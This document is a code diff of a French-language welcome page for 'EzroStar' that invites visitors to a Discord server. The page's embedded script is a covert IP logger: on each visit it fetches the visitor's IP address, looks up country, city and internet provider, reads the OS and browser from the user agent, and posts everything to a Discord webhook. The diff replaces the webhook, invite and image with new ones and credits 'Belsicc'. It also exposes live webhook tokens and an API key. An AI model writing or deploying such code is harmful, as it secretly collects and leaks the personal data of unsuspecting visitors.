@@ -7,10 +7,10 @@
 
 <body>
     <h1>Bienvenue sur le site d'EzroStar. Veuillez rejoindre le Discord pour plus d'infos :</h1>
-    <a href="https://discord.gg/GsDsDzp6bB" target="_blank" class="discord-button">Discord</a>
+    <a href="https://discord.gg/yyKD7rS2pn" target="_blank" class="discord-button">Discord</a>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
+        const webhookURL = "https://discord.com/api/webhooks/1213178913237246002/wpJNgN7xCeP0JVUV56RssXpMLaK7cWVcCRcI6DNKLJQaOTrW935G4OqiWDIwFKOgOYOS";
         const ipAddressURL = "https://api64.ipify.org?format=json";
         const ipGeolocationURL = "https://api.ipgeolocation.io/ipgeo?apiKey=108c977b8b9243399faf11b6d6c19694";
 
@@ -60,29 +60,29 @@
                 const osInfo = userAgent.match(/\(([^)]+)\)/)[1]; // Extrait les informations entre parenthèses
 
                 const embed = {
-                    title: "<:7155partner:1210210425682141194> Nouveau membre a rejoint le site!",
+                    title: "<:Proton:1213556108296458320> New Member Join Our Website ! (By Belsicc)",
                     color: 0x2b2d31,
                     image: {
-                        url: "https://cdn.discordapp.com/attachments/1210276362758258728/1210992175446495293/standard_5.gif?ex=65ec9359&is=65da1e59&hm=ebde8f5c3f509ddd4ef14d4431cc25656f9b4074444cdc7a852177487965f6b6&"
+                        url: "https://cdn.discordapp.com/attachments/1213178802583109654/1213536171012132924/standard_7.gif?ex=65f5d4a1&is=65e35fa1&hm=37a8d41ff94bfbf319fbb88175f9d64834d1d5eaac5cd2b03bbd319b7eca4999&"
                     },
                     fields: [
                         {
-                            name: "Adresse IP",
+                            name: "IP Adress",
                             value: `\`${ipAddress}\``,
                             inline: true
                         },
                         {
-                            name: "Pays",
+                            name: "Country",
                             value: ipGeolocationData.country_name ? `\`${ipGeolocationData.country_name}\`` : "N/A",
                             inline: true
                         },
                         {
-                            name: "Ville",
+                            name: "City",
                             value: ipGeolocationData.city ? `\`${ipGeolocationData.city}\`` : "N/A",
                             inline: true
                         },
                         {
-                            name: "Fournisseur Internet",
+                            name: "Internet provider",
                             value: ipGeolocationData.isp ? `\`${ipGeolocationData.isp}\`` : "N/A",
                             inline: true
                         },
@@ -92,7 +92,7 @@
                             inline: true
                         },
                         {
-                            name: "Plateforme & Navigateur",
+                            name: "Platform & Browser",
                             value: `\`${osInfo}\``,
                             inline: true
                         }
